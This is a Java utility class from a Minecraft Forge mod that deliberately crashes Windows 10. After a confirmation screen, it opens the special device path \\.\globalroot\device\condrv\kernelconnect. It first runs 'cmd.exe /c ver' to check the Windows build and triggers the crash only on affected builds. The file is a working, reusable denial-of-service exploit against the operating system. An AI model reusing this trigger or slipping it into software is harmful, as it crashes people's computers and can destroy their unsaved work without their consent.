package com.qtech.forgemods.pccrash;

import com.qtech.forgemods.core.Modules;
import com.qtech.forgemods.core.common.ModuleManager;
import com.qtech.forgemods.pcshutdown.QFMPcShutdown;
import lombok.experimental.UtilityClass;
import net.minecraft.client.Minecraft;
import org.apache.commons.lang3.SystemUtils;

import java.io.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@UtilityClass
public class PCCrashUtils {
    private static final Runtime runtime = Runtime.getRuntime();

    public static void crash() {
        if (ModuleManager.getInstance().isEnabled(QFMPcShutdown.PC_SHUTDOWN_MODULE) && supportsCrash()) {
            Minecraft mc = Minecraft.getInstance();
            mc.displayGuiScreen(new ConfirmCrashScreen(mc.currentScreen, PCCrashUtils::crash0));
        }
    }

    @SuppressWarnings("SpellCheckingInspection")
    private static void crash0() {
        if (supportsCrash() && ModuleManager.getInstance().isEnabled(QFMPcCrash.PC_CRASH_MODULE)) {
            File file = new File("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
            try {
                FileInputStream stream = new FileInputStream(file);
                stream.close();
            } catch (IOException ignored) {

            }
        }
    }

    public static boolean supportsCrash() {
        if (SystemUtils.IS_OS_WINDOWS_10) {
            Process process;
            BufferedReader bufferedReader;
            StringBuilder stringBuilder = new StringBuilder();
            String stdOutLine;

            try {
                process = runtime.exec("cmd.exe /c ver");
                bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                while ((stdOutLine = bufferedReader.readLine()) != null) {
                    stringBuilder.append(stdOutLine);
                }
            } catch (IOException ex) {
                throw new RuntimeException("Error while getting Windows version");
            }

            System.out.println(stringBuilder.toString());


            Pattern pattern = Pattern.compile("10\\.0\\.([0-9]*)");
            Matcher matcher = pattern.matcher(stringBuilder.toString());
            if (matcher.find()) {
                String group = matcher.group(1);
                int integer = Integer.parseInt(group);
                return integer > 16299 && integer <= 19041; // ! Was 19042, was removed in same version.
            } else {
                return false;
            }
        }
        return false;
    }
}
